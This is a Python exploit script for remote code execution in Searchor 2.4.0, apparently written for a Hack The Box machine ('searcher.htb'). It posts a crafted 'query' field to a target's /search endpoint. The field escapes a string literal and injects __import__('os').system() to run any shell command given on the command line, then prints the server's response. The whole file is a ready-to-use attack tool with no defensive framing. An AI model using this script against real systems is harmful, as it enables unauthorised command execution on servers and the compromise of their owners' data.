#!/usr/bin/env python3
# Searchor 2.4.0 - Remote Code Execution (RCE)
# Exploit by: [Your Name]
# Usage: python3 exploit.py -u http://target.com -c 'command'

import requests
import argparse
import signal

def ctrl_C(sig, frame):
    print("\n[+] Exiting ...")
    exit(1)

def send_command(cmd, url):
    # The payload: closes the string, injects os.system(), then comments out the rest
    payload = f"',__import__('os').system('{cmd}'))#'"
    target = f"{url.rstrip('/')}/search"
    data = {
        'engine': 'Google',
        'query': payload
    }

    try:
        print(f"[+] Sending payload: {payload}")
        resp = requests.post(target, data=data, timeout=10)
        # Print only non‑URL lines to avoid clutter
        for line in resp.text.splitlines():
            if 'http' not in line:
                print(line)
    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    signal.signal(signal.SIGINT, ctrl_C)

    parser = argparse.ArgumentParser(description='Searchor 2.4.0 RCE Exploit')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g. http://searcher.htb)')
    parser.add_argument('-c', '--command', required=True, help='Command to execute (e.g. id)')
    args = parser.parse_args()

    send_command(args.command, args.url)

if __name__ == '__main__':
    main()
